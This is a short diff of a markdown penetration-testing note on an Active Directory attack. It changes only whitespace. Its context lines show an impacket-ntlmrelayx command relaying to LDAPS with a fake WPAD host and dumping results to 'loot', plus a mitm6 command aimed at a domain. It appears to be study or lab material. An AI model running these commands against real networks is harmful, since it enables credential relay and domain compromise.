@@ -29,6 +29,7 @@ ntlmrelayx:
 
 ![](attachments/20240304150525.png)
 `impacket-ntlmrelayx -6 -t ldaps://DOMAIN-IP -wh fakewpad.DOMAIN.local -l loot`
+
 The IP specified is the Domain IP address. The information dumped will be stored in a folder named loot.
 
 mitm6:
@@ -36,6 +37,7 @@ mitm6:
 ![](attachments/20240304150712.png)
 
 `sudo mitm6 -d DOMAIN.local`
+
 Target Domain specified.
 
 ## Step 2: An Even Occurs in the Network
